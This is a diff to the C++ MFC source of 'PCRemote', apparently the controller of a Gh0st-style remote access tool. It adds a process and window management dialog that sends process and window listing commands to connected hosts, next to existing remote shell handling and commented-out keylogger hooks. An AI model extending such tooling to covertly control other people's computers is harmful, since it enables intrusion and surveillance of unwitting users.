@@ -9,6 +9,7 @@
 #include "afxdialogex.h"
 #include "CSettingDlg.h"
 #include "CShellDlg.h"
+#include "CSystemDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -78,6 +79,7 @@ public:
 // 实现
 protected:
 	DECLARE_MESSAGE_MAP()
+
 };
 
 CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
@@ -91,6 +93,7 @@ void CAboutDlg::DoDataExchange(CDataExchange* pDX)
 
 BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
 	
+
 END_MESSAGE_MAP()
 
 
@@ -147,6 +150,8 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
 	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
+	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
+
 END_MESSAGE_MAP()
 
 
@@ -157,9 +162,9 @@ void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, 
 	//::MessageBox(NULL, "有连接到来!!", "", NULL);
 	try
 	{
-		CString str;
-		str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
-		g_PCRemote->m_wndStatusBar.SetPaneText(1, str);
+		//CString str;
+		//str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
+		//g_PCRemote->m_wndStatusBar.SetPaneText(1, str);
 
 		switch (nCode)
 		{
@@ -571,6 +576,8 @@ void CPCRemoteDlg::OnOnlineFile()
 void CPCRemoteDlg::OnOnlineProcess()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_SYSTEM;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -589,6 +596,8 @@ void CPCRemoteDlg::OnOnlineVideo()
 void CPCRemoteDlg::OnOnlineWindow()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_WSLIST;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -792,9 +801,9 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	//	case KEYBOARD_DLG:
 	//		((CKeyBoardDlg*)dlg)->OnReceiveComplete();
 	//		break;
-	//	case SYSTEM_DLG:
-	//		((CSystemDlg*)dlg)->OnReceiveComplete();
-	//		break;
+		case SYSTEM_DLG:
+			((CSystemDlg*)dlg)->OnReceiveComplete();
+			break;
 		case SHELL_DLG:
 			((CShellDlg*)dlg)->OnReceiveComplete();
 			break;
@@ -852,9 +861,10 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	//case TOKEN_KEYBOARD_START:
 	//	g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 	//	break;
-	//case TOKEN_PSLIST:
-	//	g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
-	//	break;
+	case TOKEN_WSLIST:  //意思就是进程管理，窗口管理都弹出一个对话框
+	case TOKEN_PSLIST:
+		g_PCRemote->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
+		break;
 	case TOKEN_SHELL_START:		
 		  g_PCRemote->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);//::MessageBox(0,"发送弹出SHELL窗消息",0,0);
 		break;
@@ -1007,6 +1017,19 @@ LRESULT CPCRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 	pContext->m_Dialog[1] = (int)dlg;
 	return 0;
 }
+LRESULT CPCRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext* pContext = (ClientContext*)lParam;
+	CSystemDlg* dlg = new CSystemDlg(this, m_iocpServer, pContext);
+
+	// 设置父窗口为卓面
+	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = SYSTEM_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+	return 0;
+}
 
 
 LRESULT CPCRemoteDlg::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
@@ -1025,9 +1048,9 @@ LRESULT CPCRemoteDlg::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 			if (pContext == (ClientContext*)m_CList_Online.GetItemData(i))
 			{				
 				
-				strIP = m_CList_Online.GetItemText(i, ONLINELIST_IP);
+				strIP = m_CList_Online.GetItemText(i, ONLINELIST_COMPUTER_NAME);
 				strIP += "-";
-				strIP += m_CList_Online.GetItemText(i, ONLINELIST_COMPUTER_NAME);
+				strIP += m_CList_Online.GetItemText(i, ONLINELIST_IP); 
 				m_CList_Online.DeleteItem(i);
 				strIP += " 主机断开连接";
 				ShowMessage(true, strIP);
@@ -1057,3 +1080,6 @@ LRESULT CPCRemoteDlg::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 	catch (...) {}
 	return 0;
 }
+
+
+
